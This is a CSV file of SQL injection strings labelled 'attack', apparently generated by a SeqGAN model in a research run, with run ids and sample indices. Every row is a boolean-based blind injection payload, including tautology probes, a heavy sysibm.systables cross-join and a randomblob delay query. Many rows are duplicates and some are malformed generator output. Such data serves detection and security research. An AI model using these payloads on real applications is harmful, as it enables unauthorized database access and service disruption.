label,payload,family,payload_type,method,run_id,sample_index
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,479
attack,"-2925%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,480
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,481
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,482
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,483
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,484
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,485
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,486
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,487
attack,"-1422%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,488
attack,"-9688%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,489
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,490
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,491
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,492
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,493
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,494
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,495
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,496
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,497
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,498
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,499
